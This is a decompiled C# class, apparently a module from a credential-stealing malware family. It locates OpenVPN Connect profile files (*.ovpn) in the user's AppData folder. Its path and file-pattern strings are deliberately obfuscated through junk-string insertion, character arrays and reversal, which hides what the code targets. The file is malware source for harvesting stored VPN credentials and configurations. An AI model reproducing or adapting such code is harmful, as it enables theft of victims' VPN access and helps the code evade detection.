using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000019 RID: 25
public class OpenVPN : Extractor
{
	// Token: 0x0600009F RID: 159 RVA: 0x00007B78 File Offset: 0x00005F78
	public override string Id2(Entity_FileSearchInformation scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	// Token: 0x060000A0 RID: 160 RVA: 0x00007B90 File Offset: 0x00005F90
	public override IEnumerable<Entity_FileSearchInformation> Id3()
	{
		List<Entity_FileSearchInformation> list = new List<Entity_FileSearchInformation>();
		try
		{
			list.Add(new Entity_FileSearchInformation
			{
				Id1 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPFile.WriteROFILE%\\AppFile.WriteData\\RoamiFile.Writeng").Replace("File.Write", string.Empty), new string(new char[]
				{
					'O',
					'p',
					'H',
					'a',
					'n',
					'd',
					'l',
					'e',
					'r',
					'e',
					'n',
					'V',
					'P',
					'H',
					'a',
					'n',
					'd',
					'l',
					'e',
					'r',
					'N',
					' ',
					'C',
					'o',
					'n',
					'H',
					'a',
					'n',
					'd',
					'l',
					'e',
					'r',
					'n',
					'e',
					'c',
					't'
				}).Replace("Handler", string.Empty) + "\\" + new string(new char[]
				{
					'p',
					'r',
					'o',
					'f',
					'i',
					'l',
					'e',
					's'
				})),
				Id2 = new string("npvo*".Reverse<char>().ToArray<char>()),
				Id3 = false
			});
		}
		catch
		{
		}
		return list;
	}
}
